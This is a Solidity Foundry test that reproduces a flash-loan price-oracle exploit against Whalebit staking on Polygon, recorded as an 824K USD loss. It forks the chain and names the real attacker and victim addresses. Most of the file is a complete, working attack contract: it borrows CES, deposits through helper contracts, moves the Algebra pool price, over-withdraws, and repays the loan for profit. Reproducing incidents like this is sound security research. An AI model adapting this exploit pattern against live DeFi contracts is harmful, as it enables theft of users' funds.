// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 824K USD
// Attacker : 0xe66b37de57b65691b9f4ac48de2c2b7be53c5c6f
// Attack Contract : 0xb5a8d7a37d60aa662f4dc9b3ef4c32a3fe21fadf
// Vulnerable Contract : 0x9153e149b0d90dea634ed9f7df6ff71c2109b654
// Vulnerable Entry Proxy : 0x40465755eb5846d655bbcc8c186a477469f9ce36
// Attack Tx : https://polygonscan.com/tx/0x5d54fa839821e370b020d13a9b11b6f4f8cadc4eaed0a404ea17ad1bd725dbde

// @Info
// Vulnerable Contract Code : https://polygonscan.com/address/0x9153e149b0d90dea634ed9f7df6ff71c2109b654#code

// @Analysis
// Twitter Guy : https://x.com/DefimonAlerts/status/2039372077686251787
//
// The attacker flash-borrowed CES, repeatedly deposited through helper contracts, sold CES into the
// CES/USDT Algebra pool to move Whalebit's spot-price oracle, withdrew more CES than each helper had
// effectively paid in, then swapped USDT back to CES and repeated the cycle before repaying the loan.

address constant ATTACKER = 0xe66b37DE57b65691B9f4Ac48DE2c2b7be53C5c6F;
address constant CES = 0x1Bdf71EDe1a4777dB1EebE7232BcdA20d6FC1610;
address constant USDT_TOKEN = 0xc2132D05D31c914a87C6611C10748AEb04B58e8F;
address constant FLASH_POOL = 0x296b95DD0E8B726c4e358b0683ff0B6d675C35E9;
address constant ALGEBRA_POOL = 0xD3A9331A654444F9fe7DdbaEC6678C2Dc9113197;
address constant WHALEBIT_STAKING = 0x40465755EB5846d655bBcC8C186A477469f9Ce36;
address constant WHALEBIT_LEVELS = 0x1CaeFc860308b58D0B5Bb643d75c807c6a9d3a63;
address constant WHALEBIT_PRICER = 0xB5ea1d17f3D8dA34a6D6a1d2acc2a148e1411868;

interface IWhalebitLevels {
    function getPriceForLevel(
        uint256 level
    ) external view returns (uint256 cesAmount, uint256 levelAmount);
    function getBalance(
        address account
    ) external view returns (uint256);
}

interface IWhalebitStaking {
    function deposit(
        uint256 level
    ) external;
    function withdraw(
        uint256 amount
    ) external;
}

interface IAlgebraPoolState {
    function globalState()
        external
        view
        returns (uint160 price, int24 tick, uint16 lastFee, uint8 pluginConfig, uint16 communityFee, bool unlocked);
}

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 84_938_871;
        vm.createSelectFork("polygon", forkBlock);
        fundingToken = CES;

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(CES, "CES");
        vm.label(USDT_TOKEN, "USDT");
        vm.label(FLASH_POOL, "CES/USDT flash pool");
        vm.label(ALGEBRA_POOL, "CES/USDT Algebra pool");
        vm.label(WHALEBIT_STAKING, "Whalebit staking proxy");
        vm.label(WHALEBIT_LEVELS, "Whalebit levels");
        vm.label(WHALEBIT_PRICER, "Whalebit pricer");
    }

    function testExploit() public {
        WhalebitExploit exploit = new WhalebitExploit();

        // step 1: model the trace-start CES inventory that was already in the attack contract.
        uint256 traceStartCes = 140_956.392_485_016_353_593_75 ether;
        deal(CES, address(exploit), traceStartCes);

        uint256 beforeCes = IERC20(CES).balanceOf(address(exploit));
        logTokenBalance(CES, address(exploit), "Attack Contract Before");

        vm.prank(ATTACKER, ATTACKER);
        exploit.attack();

        uint256 afterCes = IERC20(CES).balanceOf(address(exploit));
        uint256 profit = afterCes - beforeCes;
        logTokenBalance(CES, address(exploit), "Attack Contract After");
        assertGt(profit, 9000 ether, "CES profit after flash repayment");
    }
}

contract WhalebitExploit {
    uint256 private constant LEVEL = 12;

    IERC20 private constant ces = IERC20(CES);
    IERC20 private constant usdt = IERC20(USDT_TOKEN);
    Uni_Pair_V3 private constant flashPool = Uni_Pair_V3(FLASH_POOL);
    Uni_Pair_V3 private constant algebraPool = Uni_Pair_V3(ALGEBRA_POOL);
    IAlgebraPoolState private constant algebraPoolState = IAlgebraPoolState(ALGEBRA_POOL);
    IWhalebitLevels private constant levels = IWhalebitLevels(WHALEBIT_LEVELS);

    WhalebitHelper[5] private helpers;

    constructor() {
        for (uint256 i = 0; i < helpers.length; i++) {
            helpers[i] = new WhalebitHelper();
        }
    }

    function attack() external {
        uint256 flashAmount = ces.balanceOf(FLASH_POOL);
        flashPool.flash(address(this), flashAmount, 0, abi.encode(flashAmount));
    }

    function uniswapV3FlashCallback(
        uint256 fee0,
        uint256,
        bytes calldata data
    ) external {
        require(msg.sender == FLASH_POOL, "not flash pool");

        uint256 principal = abi.decode(data, (uint256));
        (uint256 cesAmount,) = levels.getPriceForLevel(LEVEL);

        // step 2: three trace rounds of helper deposits, spot-price movement, withdrawals, and restoration swaps.
        for (uint256 round = 0; round < 3; round++) {
            for (uint256 i = 0; i < helpers.length; i++) {
                ces.transfer(address(helpers[i]), cesAmount);
                helpers[i].deposit(LEVEL);
            }

            uint256 amountIn = ces.balanceOf(address(this));
            (uint160 price,,,,,) = algebraPoolState.globalState();
            algebraPool.swap(address(this), true, int256(amountIn), uint160((uint256(price) * 45) / 100), "");

            for (uint256 i = 0; i < helpers.length; i++) {
                helpers[i].withdraw();
            }

            amountIn = usdt.balanceOf(address(this));
            (price,,,,,) = algebraPoolState.globalState();
            algebraPool.swap(address(this), false, int256(amountIn), uint160(uint256(price) * 2), "");
        }

        // step 3: repay the CES flash loan plus fee, leaving the manipulated CES profit in this contract.
        uint256 repayment = principal + fee0;
        ces.transfer(FLASH_POOL, repayment);
    }

    function algebraSwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata
    ) external {
        require(msg.sender == ALGEBRA_POOL, "not Algebra pool");

        if (amount0Delta > 0) {
            ces.transfer(ALGEBRA_POOL, uint256(amount0Delta));
        }
        if (amount1Delta > 0) {
            usdt.transfer(ALGEBRA_POOL, uint256(amount1Delta));
        }
    }
}

contract WhalebitHelper {
    IERC20 private constant ces = IERC20(CES);
    IWhalebitLevels private constant levels = IWhalebitLevels(WHALEBIT_LEVELS);
    IWhalebitStaking private constant staking = IWhalebitStaking(WHALEBIT_STAKING);

    constructor() {
        ces.approve(WHALEBIT_PRICER, type(uint256).max);
    }

    function deposit(
        uint256 level
    ) external {
        staking.deposit(level);
        returnCes(msg.sender);
    }

    function withdraw() external {
        uint256 balance = levels.getBalance(address(this));
        staking.withdraw(balance);
        returnCes(msg.sender);
    }

    function returnCes(
        address receiver
    ) private {
        uint256 balance = ces.balanceOf(address(this));
        if (balance != 0) {
            ces.transfer(receiver, balance);
        }
    }
}
